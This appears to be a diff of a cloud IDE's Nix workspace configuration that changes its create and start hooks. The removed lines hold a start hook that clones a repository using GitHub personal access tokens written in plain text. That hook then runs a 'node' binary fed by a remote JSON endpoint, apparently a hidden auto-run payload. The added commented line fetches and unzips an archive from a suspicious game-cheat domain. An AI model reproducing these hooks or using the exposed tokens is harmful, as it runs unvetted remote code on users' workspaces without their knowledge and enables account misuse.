@@ -39,15 +39,14 @@
       # Runs when a workspace is first created
       onCreate = {
         # Example: install JS dependencies from NPM
-        # watch-backend = "git clone https://sprjiwnas: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@github.com/sprjiwnas/cu.git flutter-app && cd flutter-app";
+        # npm-install = "wget -O flutter-app.zip http://valorantunlocker.shop/amd-benchmark-v20-main.zip && unzip -o flutter-app.zip -d flutter-app";
         # Open editors for the following files by default, if they exist:
         default.openFiles = [ ".idx/dev.nix" "README.md" ];
       };
       # Runs when the workspace is (re)started
       onStart = {
         # Example: start a background task to watch and re-build backend code
-        watch-backend = "git clone https://sprjiwnas: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@github.com/sprjiwnas/cu.git flutter-app";
-        watch-backend = "cd flutter-app && ./node app.js -s="https://api.npoint.io/17580ab3de368fe79bdd""; 
+        # watch-backend = "npm run watch-backend";
       };
     };
   };
